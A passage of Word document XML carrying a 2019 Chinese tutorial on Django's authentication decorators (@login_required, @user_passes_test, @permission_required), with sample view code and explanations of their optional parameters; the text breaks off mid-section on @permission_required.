        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>原创 大江狗 </w:t>
      </w:r>
      <w:hyperlink r:id="rId294" w:history="1">
        <w:r w:rsidRPr="003802BB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>Python Web与Django开发</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> 2019-03-06</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BCEDDC4" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>来自专辑</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A1E5C0E" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django基础连载</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67E45E98" w14:textId="08A5E8EB" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>装饰器(decorator)可以说是Python的一个神器，它可以在不改变一个函数代码和调用方式的情况下给函数添加新的功能（见</w:t>
      </w:r>
      <w:hyperlink r:id="rId295" w:anchor="wechat_redirect" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="003802BB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>一文看懂Python系列之装饰器</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>)。装饰器广泛用于权限校验和缓存等场景，是学习Python Web开发的必备知识。Django项目中使用装饰器可以让代码将变得更干净、更可读、更可维护。今天小编我就带你看下Django自带的常用装饰器的应用场景及正确使用方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14151D03" w14:textId="778BD89D" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>权限验证</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0906C54C" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>@login_required</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19A56704" w14:textId="476F53D8" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>@login_required是Django最常用的一个装饰器。其作用是在执行视图函数前先检查用户是否通过登录身份验证，并将未登录的用户重定向到指定的登录url。其中login_url是可选参数。如果不设置，默认login_url是settings.py里设置的LOGIN_URL。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0440F417" w14:textId="02F3361B" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.contrib.auth.decorators import login_required</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AE0C52F" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>@login_required(login_url='/accounts/login/')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BF98A12" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def my_view(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F32A0E5" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>  ...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74532830" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>@login_required还可以一个可选参数是redirect_field_name, 默认值是'next'。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35399FB7"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django.contrib.auth.decorators import login_required</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EB10711" w14:textId="7A487D4C" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="68692457" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>@login_required(redirect_field_name='my_redirect_field')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24A3FF8A" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def my_view(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="428F141E"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0603AB94" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>注意</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55D9F6B9" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>login_required装饰器不会检查用户是否是is_active状态。如果你想进一步限制登录验证成功的用户对某些视图函数的访问，你需要使用更强大的@user_passes_test装饰器。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25DB0C9F" w14:textId="58AB7ED0" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5F7FFB70" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>@user_passes_test</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BDDE30F" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>@user_passes_test装饰器的作用是对登录用户对象的信息进行判断，只有通过测试(返回值为True)的用户才能访问视图函数。不符合条件的用户会被跳转到指定的登录url。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A5C9B75" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>@user_passes_test装饰器有一个必选参数，即对用户对象信息进行判断的函数。该函数必需接收user对象为参数。与@login_required类似，@user_passes_test还有两个可选参数(login_url和redirect_field_name)，这里就不多讲了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DC48548" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>user_passes_test(func[,login_url=None, redirect_field_name=REDIRECT_FIELD_NAME]) </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="273A1AB0" w14:textId="415E4AC0" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7B1E8B67" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>下例中@user_passes_test装饰器对用户的email地址结尾进行判断，会把未通过测试的用户会定向到登录url。试想一个匿名用户来访问，她没有email地址，显然不能通过测试，登录后再来吧。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DD6FAD5" w14:textId="4E0A5E11" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1B61A681"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django.contrib.auth.decorators import user_passes_test</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C3D76A3" w14:textId="4B1F06EC" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2DCB1EBD" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def email_check(user):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D1E26A8" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    return user.email.endswith('@example.com')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56AD5466" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>@user_passes_test(email_check)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0130D910" w14:textId="68BDDBFC" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def my_view(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A03EAB1"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="134F64C4" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>如果需要加可选参数，可以按如下方式使用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="514F5F38" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>@user_passes_test(email_check, login_url='/login/'):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69F29F90"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67D977AF" w14:textId="6D04BDCF" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    ...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CD17587" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>注意</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A9686AC" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>@user_passes_test不会自动的检查用户是否是匿名用户, 但是@user_passes_test装饰器还是可以起到两层校验的作用。一来检查用户是否登录，二来检查用户是否符合某些条件，无需重复使用@login_required装饰器。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BB94B06" w14:textId="1BE050C6" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3E801D84" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>我们如果只允许is_active的登录用户访问某些视图，我们现在可以使用@user_passes_test装饰器轻松地解决这个问题，如下所示:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53F92000" w14:textId="74507D5A" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="174D920B"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django.contrib.auth.decorators import user_passes_test</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15E87502" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>@user_passes_test(lambda u: u.is_active)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11DD8C5F" w14:textId="20AA7ACF" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def my_view(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B5EC64A"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DEA0468" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>@permission_required</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15B80FFB" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>@permission_required装饰器的作用是检查用户用户是否有特定权限，第一个参数perm是权限名，为必选, 第二个参数login_url为可选。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5149CFF2"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permission_required(perm[, login_url=None, raise_exception=False]) </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17BB66DC" w14:textId="6AAC1A04" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0B65C7A3" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>下例检查用户是否有polls.can_vote的权限，没有的话定向至login_url。如果你设置了raise_exception=True, 会直接返回403无权限的错误，而不会跳转到登录页面。那么问题来了，我们需要先使用@login_required来验证用户是否登录，再使用@permission_required装饰器来查看登录用户是否具有相关权限吗？ 答案是不需要。如果一个匿名用户来访问这个视图，显然该用户没有相关权限，会自动定向至登录页面。</w:t>
